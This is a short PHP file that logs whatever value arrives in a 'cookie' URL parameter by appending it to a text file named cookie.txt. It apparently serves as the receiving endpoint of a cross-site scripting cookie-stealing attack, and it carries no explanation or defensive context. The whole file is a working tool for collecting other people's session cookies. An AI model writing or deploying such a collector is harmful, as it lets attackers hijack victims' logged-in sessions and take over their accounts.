<meta charset="utf-8"></meta>
<?php
$cookie = $_GET['cookie'];
$log = fopen("cookie.txt","a");
fwrite($log, $cookie ."\n");
fclose($log);
?>